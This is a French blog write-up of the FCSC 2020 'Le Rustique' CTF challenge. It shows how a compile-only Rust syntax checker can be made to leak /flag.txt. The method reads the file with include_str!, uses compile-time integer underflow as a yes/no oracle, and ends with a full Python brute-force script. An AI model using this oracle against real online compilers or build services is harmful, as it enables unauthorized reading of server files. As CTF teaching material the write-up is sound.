---
layout: post
title: FCSC 2020 - Le Rustique [Misc 200]
---

Le principe du challenge est simple : nous devons trouver un moyen de faire fuiter le fichier contenant le flag depuis un checker de syntaxe Rust en ligne. 

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust1.png)

N'ayant jamais utilisé Rust, ce challenge m'a un peu effrayé initialement mais je suis parvenu à en obtenir le flag après quelques heures avec une payload simple. Cela m'a aussi permis d'en apprendre plus sur ce langage et de relativiser certains préjugés sur sa complexité.

Testons tout d'abord un Hello World trouvé dans la documentation du langage, puis un code qui ne compilera pas :

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust3.png)

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust4.png)

Le checker est très peu verbeux, et ne renvoie que succès/échec. En inspectant les réponses de l'API, on pourrait espérer avoir un message d'erreur plus probant, mais ce n'est pas le cas : elle renvoie simplement `{"result":1}` ou `{"result":0}`.

Jetons un oeil à la FAQ :

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust2.png)

Nous pouvons en tirer trois informations importantes :

- Le code est compilé par rustc mais jamais exécuté
- La version de Rust sur le serveur est 1.14.0
- Un flag est présent à la racine du système dans /flag.txt

Ainsi, nous pouvons reproduire localement l'environnement du serveur pour pouvoir tester les payloads en ayant un retour plus complet du compilateur.

Nous allons tout d'abord devoir trouver une manière d'importer un fichier texte au moment de la compilation, puis effectuer des opérations pour faire fuiter le contenu du fichier.

### Première approche

Mon idée initiale était d'importer le flag comme une source Rust puis d'effectuer des transformations dessus pour récupérer des informations en fonction du succès/échec de la compilation.

On peut spécifier le chemin d'import en Rust en utilisant un attribute sur le module au moment de l'import : `#[path="/flag.txt"] mod flag;`. En revanche, rustc nous donne une belle erreur qui montre l'erreur de parsing sur notre "module" flag.txt :

```
error: expected one of `!` or `::`, found `{`
 --> flag.txt:1:5
  |
1 | FCSC{ceci est mon flag en local}
  |     ^ expected one of `!` or `::`

error: aborting due to previous error`
```

Je n'ai cependant pas trouvé de technique pour effectuer les transformations sur le texte du flag avant compilation, nous allons donc devoir explorer une autre piste.

### Utilisation des strings constantes

La seconde technique que j'ai trouvée pour lire des fichiers externes au moment de la compilation s'avère être plus fructueuse : il s'agit d'utiliser les macros `include_str` ou `include_bytes`. La documentation Rust nous donne un exemple d'utilisation facile à comprendre :

```rust
fn main() {
    let my_str = include_str!("spanish.in");
    assert_eq!(my_str, "adiós\n");
    print!("{}", my_str);
}
```

Pour confirmer que le fichier est effectivement lu au moment de la compilation avec ces macros, nous pouvons effectuer deux vérifications : tout d'abord, essayons d'importer un fichier inexistant.

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust5.png)

La compilation nous renvoie une erreur comme nous l'attendions. Un doute peut encore subsister : paut-être que le compilateur extrêmement rigoureux de Rust vérifie simplement que le fichier est présent au moment de la compilation, mais celui-ci n'est lu qu'à l'exécution. Pour lever ce doute, on peut vérifier que le contenu du fichier texte est bien présent dans l'exécutable.

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust6.png)

Voilà qui est rassurant, nous allons donc pouvoir essayer de titiller le compilateur pour lui faire cracher des erreurs en fonction du contenu du flag.

### Exfiltration du flag

Rust est un langage très strict, et il n'accepte pas que nous fassions des bêtises. Il y a deux bêtises qui énervent Rust et qui vont nous servir :

- Lire un caractère qui dépasse la fin d'une string
- Faire un overflow/underflow sur la valeur d'un entier

Nous utiliserons des variables `const` qui sont calculées au moment de la compilation, pour pouvoir effectivement déclencher les erreurs qui nous intéressent.

Utilisons la première astuce pour récupérer la taille du flag :

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust7.png)

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust8.png)

On constate que le compilateur n'a aucun souci pour nous permettre de lire `flag[70]` mais nous renvoie une erreur pour `flag[71]`, ce qui signifie que le flag fait 70 caractères. C'est cohérent avec le format de flags du CTF `FCSC{<64 hex>}`.

La seconde astuce nous permet maintenant de faire fuiter un caractère individuel du flag, en manipulant soigneusement les données pour créer un underflow d'entier (faire passer la valeur d'un entier unsigned sous zéro).

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust9.png)

![img]({{ site.baseurl }}/images/2020-05-fcsc/rust10.png)

La compilation plante lorsque nous faisons `flag[0] - 71` mais pas avec `flag[0] - 70` : le passage à une valeur négative se fait après 70, on peut donc en déduire que la premier caractère du flag est `F` dont le code ASCII est 70.

### Automatisation

Maintenant que nous avons une requête valide qui permet d'extraire des informations sur les caractères du flag, passons à l'automatisation. Il semble nécessaire de scripter les requêtes, car la partie hexadécimale du flag a une entropie de 256 bits, ce qui signifie que nous devrons faire 256 requêtes au minimum.

On peut automatiser une requête à l'API très simplement avec le module python `requests` :

```python
import requests

code = '''
fn main() {
    const s: &'static str = include_str!("/flag.txt");
    const b: u8 = s.as_bytes()[%d]-%d;
}
'''

def check(position, value):
    response = requests.post('http://challenges2.france-cybersecurity-challenge.fr:6005/check',
                             json={'content':code%(position,value)})
    return response.json()['result']   
```

On peut maintenant écrire la fonction qui trouve un caractère du flag. Une recherche dichotomique aurait été efficace (4 requêtes par caractère hex au lieu de 16), mais j'ai mis de côté mon esprit d'algorithmicien : en CTF, l'efficacité de la solution importe peu tant qu'on obtient le flag avant la fin, l'essentiel est de perdre le moins de temps possible sur l'implémentation. On va donc faire une recherche linéaire naïve :

```python
def search(pos):
    for c in '0123456789abcdef':
        if check(pos, ord(c)+1):
            return c
    return 'XXX'
```

Il ne nous reste plus qu'à itérer sur tous les caractères du flag pour gagner 200 points !

```python
flag = 'FCSC{'
for pos in range(5,70):
    flag += search(pos)
    print(flag)
```

À en croire mon historique de navigation, j'ai résolu ce challenge en un peu plus d'1h20, bien plus rapidement (et avec une payload bien plus courte) que je ne l'anticipais en voyant l'énoncé !

Merci à [\J](https://twitter.com/cryptanalyse) pour ce challenge, et merci à mon bfam [SIben](https://twitter.com/_SIben_) pour m'avoir incité à le regarder alors que Rust ma faisait peur :)

---

### Annexe - code source complet

```python
import requests

code = '''
fn main() {
    const s: &'static str = include_str!("/flag.txt");
    const b: u8 = s.as_bytes()[%d]-%d;
}
'''

def check(pos, val):
    response = requests.post('http://challenges2.france-cybersecurity-challenge.fr:6005/check', json={'content':code%(pos,val)})
    return response.json()['result']    

def search(pos):
    for c in '0123456789abcdef':
        if check(pos, ord(c)+1):
            return c
    return 'XXX'

flag = 'FCSC{'
for pos in range(5,70):
    flag += search(pos)
    print(flag)
```